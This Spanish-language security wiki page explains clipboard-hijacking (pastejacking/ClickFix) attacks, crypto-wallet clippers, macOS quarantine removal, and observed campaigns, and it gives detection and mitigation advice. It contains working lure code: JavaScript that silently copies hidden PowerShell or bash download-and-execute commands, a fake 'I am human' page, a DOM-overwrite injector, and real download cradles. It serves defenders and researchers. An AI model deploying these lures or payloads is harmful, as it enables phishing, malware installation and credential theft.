# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues nada que no hayas copiado tú mismo." – un consejo antiguo, pero aún válido

## Descripción general

El clipboard hijacking – también conocido como *pastejacking* – aprovecha el hecho de que los usuarios suelen copiar y pegar comandos sin revisarlos. Una página web maliciosa (o cualquier contexto compatible con JavaScript, como una aplicación Electron o de escritorio) coloca mediante programación texto controlado por el atacante en el portapapeles del sistema. Se anima a las víctimas, normalmente mediante instrucciones de ingeniería social cuidadosamente preparadas, a pulsar **Win + R** (cuadro de diálogo Ejecutar), **Win + X** (Acceso rápido / PowerShell), o abrir una terminal y *pegar* el contenido del portapapeles, lo que ejecuta inmediatamente comandos arbitrarios.

Como **no se descarga ningún archivo ni se abre ningún archivo adjunto**, la técnica elude la mayoría de los controles de seguridad de correo electrónico y contenido web que supervisan archivos adjuntos, macros o la ejecución directa de comandos. Por ello, el ataque es popular en campañas de phishing que distribuyen familias de malware comunes, como NetSupport RAT, el loader Latrodectus o Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper de reemplazo de direcciones de wallet

Otra variante de **clipboard hijacking** no pega comandos: espera a que la víctima copie una **dirección de wallet de criptomonedas** y, justo antes de pegarla, la reemplaza silenciosamente por una controlada por el atacante. Esto resulta especialmente eficaz con formatos de wallet largos, porque los usuarios suelen verificar solo los primeros o los últimos caracteres.<sup>[[8]](#references)</sup>

Características comunes en casos reales:
- **Loader ligero + payload anidado**: la aplicación o el ejecutable visibles parecen una herramienta legítima de trading o de "ganancias", mientras que el clipper real está oculto en una parte más profunda del paquete (por ejemplo, un loader de .NET que inicia un payload de Rust anidado).
- **Reemplazo basado en regex**: el malware busca cadenas como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` o incluso cadenas genéricas de **44 caracteres similares a las de Solana**, y las reescribe para sustituirlas por wallets del atacante.
- **Rotación de wallets a gran escala**: las muestras modernas para Windows pueden incluir **miles** de wallets de reemplazo por moneda, en lugar de una sola dirección estática, lo que reduce el desgaste de la reputación de las wallets tras cada robo.<sup>[[8]](#references)</sup>

### Flujo de un clipper para Windows

Una implementación común usa una ventana oculta registrada con **`AddClipboardFormatListener`**. En cada actualización del portapapeles, el malware suele llamar a:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → acceder a los datos actuales del portapapeles.
- **`GetClipboardData`** → leer el texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → reemplazar la cadena de la wallet por el valor del atacante.

Expresiones regulares mínimas que se suelen encontrar en clippers:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

La persistencia a nivel de usuario es suficiente para causar impacto. Un patrón observado es:<sup>[[8]](#references)</sup>
- Copiar el payload a **`%APPDATA%\silke\silke.exe`**
- Crear un **LNK en la carpeta Startup** bajo `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideas de detección:
- Procesos que llaman continuamente a las API del portapapeles y, a la vez, escriben en `%APPDATA%` y en la carpeta **Startup** del usuario.
- Creación de un LNK/ejecutable nuevo seguida de cambios en el portapapeles que reemplazan direcciones de wallets.
- Archivos comprimidos o paquetes de software falso que contienen muchos archivos sin usar y un pequeño launcher que inicia un binario anidado.

### Eliminación de cuarentena mediante ingeniería social en macOS + persistencia de LaunchAgent

En macOS, algunas campañas distribuyen un helper **`unlocker.command`** e indican a la víctima que haga clic derecho → **Abrir** si Gatekeeper dice que la app está dañada o procede de un desarrollador no identificado. El script simplemente elimina la cuarentena e inicia la `.app` cercana:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Esto **no** es un exploit de Gatekeeper; es un **bypass de cuarentena mediante ingeniería social** que aprovecha el hecho de que las decisiones de Gatekeeper dependen del atributo extendido `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Tras ejecutarse, el clipper puede persistir como usuario actual escribiendo:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent con `RunAtLoad` y `KeepAlive`

Un detalle útil para la defensa es que algunas muestras implementan un **watchdog autorreparable** que vuelve a escribir el LaunchAgent y el wrapper cada ~30 segundos. Si eliminas primero el plist **sin terminar el proceso en ejecución**, el malware podría recrearlo de inmediato.<sup>[[8]](#references)</sup> Orden seguro de limpieza:
1. Termina el proceso activo del clipper.
2. Descarga/elimina el plist de LaunchAgent.
3. Elimina `~/launch.sh` y el payload copiado.

### Nota sobre la distribución: la reputación falsa como multiplicador de fuerza

En esta familia, el malware puede seguir siendo técnicamente simple, mientras que la **capa de distribución** hace el trabajo pesado: se usan estrellas/forks falsos de GitHub, reseñas/descargas de SourceForge, comentarios/vistas de tutoriales de YouTube y comentarios/votos aparentemente legítimos en VirusTotal para hacer que el binario parezca confiable antes de ejecutarlo.<sup>[[8]](#references)</sup>

## Botones de copia forzada y payloads ocultos (comandos de una línea para macOS)

Algunos infostealers de macOS clonan sitios de instalación (p. ej., Homebrew) y **obligan a usar un botón de “Copy”** para impedir que los usuarios seleccionen solo el texto visible. La entrada del portapapeles contiene el comando de instalación esperado más un payload Base64 añadido (p. ej., `...; echo <b64> | base64 -d | sh`), por lo que pegarlo una sola vez ejecuta ambos, mientras la interfaz oculta la etapa adicional.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Las campañas más antiguas usaban `document.execCommand('copy')`; las más recientes dependen de la **Clipboard API** asíncrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## El flujo de ClickFix / ClearFake

1. El usuario visita un sitio con typosquatting o comprometido (p. ej., `docusign.sa[.]com`).
2. El JavaScript **ClearFake** inyectado llama a una función auxiliar `unsecuredCopyToClipboard()` que guarda silenciosamente en el portapapeles un comando de PowerShell de una sola línea codificado en Base64.
3. Las instrucciones HTML le indican a la víctima: *«Pulsa **Win + R**, pega el comando y pulsa Enter para resolver el problema»*.
4. `powershell.exe` se ejecuta y descarga un archivo comprimido que contiene un ejecutable legítimo y una DLL maliciosa (el clásico DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistencia (p. ej., una tarea programada), lo que acaba ejecutando NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Ejemplo de cadena de NetSupport RAT

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (Java WebStart legítimo) busca `msvcp140.dll` en su directorio.
* La DLL maliciosa resuelve dinámicamente las API con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) mediante **curl.exe**, los descifra usando una clave XOR rotativa `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el downloader JScript dentro de **cscript.exe**
3. Obtiene un payload MSI → deposita `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer mediante MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

La llamada a **mshta** inicia un script de PowerShell oculto que descarga `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y la concatenación de archivos y, finalmente, ejecuta un script `.a3x` que exfiltra credenciales del navegador a `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Portapapeles → PowerShell → JS eval → LNK de inicio con C2 rotativo (PureHVNC)

Algunas campañas de ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen una línea que descarga y ejecuta JavaScript mediante WSH, establece persistencia y rota el C2 a diario. Ejemplo de cadena observada:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Rasgos clave
- URL ofuscada que se invierte en tiempo de ejecución para evitar una inspección superficial.
- JavaScript se mantiene persistente mediante un Startup LNK (WScript/CScript) y selecciona el C2 según el día actual, lo que permite una rápida rotación de dominios.<sup>[[3]](#references)</sup>

Fragmento mínimo de JS usado para rotar los C2 según la fecha:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

La siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), a menudo fijando TLS a un certificado codificado de forma rígida y fragmentando el tráfico.<sup>[[3]](#references)</sup>

Ideas de detección específicas de esta variante
- Árbol de procesos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Artefactos de inicio: LNK en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` que invoca WScript/CScript con una ruta de JS bajo `%TEMP%`/`%APPDATA%`.
- Telemetría de Registry/RunMRU y de la línea de comandos que contenga `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ejecuciones repetidas de `powershell -NoProfile -NonInteractive -Command -` con cargas útiles grandes en stdin para introducir scripts largos sin líneas de comandos extensas.
- Scheduled Tasks que posteriormente ejecutan LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` bajo una tarea/ruta que parece de actualización (p. ej., `\GoogleSystem\GoogleUpdater`).

Caza de amenazas
- Nombres de host y URL de C2 que rotan a diario con el patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escritura en el portapapeles seguidos de pegar con Win+R y ejecutar `powershell.exe` inmediatamente.

Los equipos de defensa pueden combinar la telemetría del portapapeles, la creación de procesos y el registro para detectar el abuso de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva un historial de comandos de **Win + R**; buscar entradas inusuales en Base64 u ofuscadas.
* Security Event ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` y `NewProcessName` esté en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para la creación de archivos en `%LocalAppData%\Microsoft\Windows\WinX\` o en carpetas temporales justo antes del evento 4688 sospechoso.
* Sensores de portapapeles de EDR (si están disponibles): correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso de PowerShell.

## Páginas de verificación estilo IUAM (ClickFix Generator): copia del portapapeles a la consola + cargas útiles adaptadas al SO

Campañas recientes producen en masa páginas falsas de verificación de CDN/navegador ("Just a moment…", estilo IUAM) que coaccionan a los usuarios para que copien comandos específicos del SO desde el portapapeles a consolas nativas. Esto saca la ejecución del sandbox del navegador y funciona tanto en Windows como en macOS.<sup>[[4]](#references)</sup>

Características principales de las páginas generadas por el builder
- Detección del SO mediante `navigator.userAgent` para adaptar las cargas útiles (Windows PowerShell/CMD frente a macOS Terminal). Opcionalmente, señuelos o comandos nulos para SO no compatibles mantienen la ilusión.
- Copia automática al portapapeles tras acciones inocuas en la interfaz (casilla de verificación/Copiar), aunque el texto visible puede diferir del contenido del portapapeles.
- Bloqueo de dispositivos móviles y una ventana emergente con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → abrir Terminal→paste→Enter.
- Ofuscación opcional e inyector de un solo archivo para sobrescribir el DOM de un sitio comprometido con una interfaz de verificación con estilo Tailwind (sin necesidad de registrar un dominio nuevo).<sup>[[4]](#references)</sup>

Ejemplo: discrepancia del portapapeles + ramificación según el SO
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

Persistencia en macOS de la ejecución inicial
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de cerrar la terminal, reduciendo los rastros visibles.<sup>[[4]](#references)</sup>

Secuestro de páginas in situ en sitios comprometidos
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Ideas de detección y hunting específicas para señuelos de estilo IUAM
- Web: páginas que vinculan la Clipboard API a widgets de verificación; discrepancia entre el texto mostrado y el contenido del portapapeles; lógica condicional según `navigator.userAgent`; Tailwind + reemplazo de página única en contextos sospechosos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción con el navegador; instaladores batch/MSI ejecutados desde `%TEMP%`.
- Endpoint macOS: Terminal/iTerm inicia `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; trabajos en segundo plano que siguen activos tras cerrar la terminal.
- Correlaciona el historial de `RunMRU` de Win+R y las escrituras en el portapapeles con la creación posterior de procesos de consola.

Consulta también estas técnicas complementarias

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluciones de 2026 de CAPTCHA falsos / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake sigue comprometiendo sitios de WordPress e inyectando JavaScript loader que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas de “etherhiding” en blockchain (p. ej., solicitudes POST a endpoints de la API de Binance Smart Chain como `bsc-testnet.drpc[.]org`) para obtener la lógica actual de los señuelos. Las superposiciones recientes recurren mucho a CAPTCHA falsos que indican a los usuarios que copien y peguen un one-liner (T1204.004), en vez de descargar nada.<sup>[[6]](#references)</sup>
- La ejecución inicial se delega cada vez más a hosts de scripts firmados/LOLBAS. En enero de 2026, las cadenas sustituyeron el uso anterior de `mshta` por `SyncAppvPublishingServer.vbs`, integrado en el sistema y ejecutado mediante `WScript.exe`, con argumentos similares a PowerShell que usan alias y comodines para obtener contenido remoto:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` está firmado y normalmente se usa con App-V; combinado con `WScript.exe` y argumentos inusuales (alias `gal`/`gcm`, cmdlets con comodines y URLs de jsDelivr), se convierte en una etapa LOLBAS de alta confianza para ClearFake.<sup>[[6]](#references)</sup>
- En febrero de 2026, las cargas útiles de CAPTCHA falsas volvieron a usar únicamente download cradles de PowerShell. Dos ejemplos activos:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - La primera cadena es un grabber en memoria `iex(irm ...)`; la segunda usa `WinHttp.WinHttpRequest.5.1` como etapa intermedia, escribe un `.ps1` temporal y luego lo ejecuta con `-ep bypass` en una ventana oculta.<sup>[[6]](#references)</sup>

Consejos de detección y búsqueda para estas variantes
- Linaje de procesos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o cradles de PowerShell inmediatamente después de escrituras en el portapapeles o de usar Win+R.
- Palabras clave en la línea de comandos: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, dominios de jsDelivr/GitHub/Cloudflare Worker o patrones `iex(irm ...)` con IP directa.
- Red: conexiones salientes a hosts de CDN Worker o endpoints RPC de blockchain desde hosts de scripts/PowerShell poco después de navegar por la web.
- Archivos/registro: creación de `.ps1` temporales en `%TEMP%` y entradas de RunMRU que contengan estas líneas de comando; bloquear/alertar cuando LOLBAS con firma (WScript/cscript/mshta) se ejecuten con URL externas o cadenas de alias ofuscadas.

## Tácticas de ClickFix de junio de 2026: telemetría de pegado, comentarios de verificación falsos y encadenamiento de LOLBin

La telemetría reciente de Red Canary muestra que el indicador estable **no es un comando exacto**, sino la combinación de **pegado y ejecución asistidos por el usuario**, **intérpretes/LOLBins confiables**, **flags ofuscados**, **obtención remota** y **ejecución inmediata**.<sup>[[7]](#references)</sup>

### Patrones destacados de los operadores

- **Telemetría de confirmación del pegado**: algunas cargas útiles llaman a `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` antes de la etapa real. Esto confirma la interacción del usuario, manteniendo la ventana de tiempo breve y discreta.
- **Comentarios de verificación falsos**: las líneas de comando de PowerShell pueden añadir cadenas como `# Security check ✔️ I'm not a robot Verification ID: 138105` para que el comando siga pareciendo relacionado con un CAPTCHA después de pegarlo en el historial de Run / `cmd.exe` / PowerShell.
- **Reconstrucción dinámica de URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita incluir una URL estática en la línea de comandos y aun así descarga y ejecuta el contenido en memoria.
- **Ejecución de instaladores disfrazados**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa de una combinación inusual de mayúsculas y caracteres similares a Unicode en los flags para eludir detecciones frágiles, sin dejar de parecerse a `msiexec.exe`.
- **Cadenas de LOLBin con escapes de acento circunflejo**: `cmd.exe` puede ocultar palabras clave usando escapes `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iniciar el shell anidado minimizado, guardar el contenido del atacante con una extensión inofensiva como `.pdf` y luego ejecutarlo mediante `mshta`.<sup>[[7]](#references)</sup>
## Mitigaciones

1. Refuerzo del navegador: desactivar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem`, etc.) o exigir una acción del usuario.
2. Concienciación sobre seguridad: enseñar a los usuarios a *escribir* los comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear líneas de comando arbitrarias.
4. Controles de red: bloquear solicitudes salientes a dominios conocidos de pastejacking y C2 de malware.

## Trucos relacionados

* **Discord Invite Hijacking** suele abusar del mismo enfoque de ClickFix después de atraer a los usuarios a un servidor malicioso:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [Soluciona el clic: cómo prevenir el vector de ataque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Bajo la cortina pura: de RAT a builder y coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [La fábrica de ClickFix: primera exposición del generador IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, el año del infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Análisis de inteligencia: febrero de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Análisis de inteligencia: junio de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – De estrellas a votos positivos: reputación falsa que alimenta un secuestrador del portapapeles de criptomonedas](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
